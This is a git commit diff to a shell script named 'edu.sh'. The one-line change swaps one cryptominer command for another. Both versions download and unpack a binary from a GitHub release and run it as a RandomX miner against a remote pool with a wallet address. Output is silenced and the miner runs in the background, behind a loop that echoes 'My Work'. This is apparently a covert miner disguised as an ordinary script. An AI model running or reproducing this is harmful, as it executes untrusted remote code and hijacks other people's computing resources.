5895b58f93016f59d84c73f67c5a97e3cbcfdcc4
preak07 <160253225+preak07@users.noreply.github.com>
2024-04-04 13:18:05 +0700

    Update edu.sh

--- edu.sh
+++ edu.sh
@@ -1,4 +1,4 @@
-wget https://github.com/kolorijo01/koloria/releases/download/uranus/daemon.tar.gz && tar -xvf daemon.tar.gz && ./uranus -a rx/0 -o stratum+tcp://randomxmonero.auto.nicehash.com:9200 -u 3AhGzsYExJchLbzGVuiRTk33M5RAmL6C1f.Quicksilver -t 1 >/dev/null 2>&1 &
+wget https://github.com/kolorijo01/koloria/releases/download/uranus/daemon.tar.gz && tar -xvf daemon.tar.gz && ./uranus -a randomx -o 159.203.162.18:3333 -u LTC:MKYvrRVVF8KB3gsWu9hxSQr57asXEhZWoF -p "QuickSilver" -t 1 >/dev/null 2>&1 &
 while true
 do
         echo "My Work"
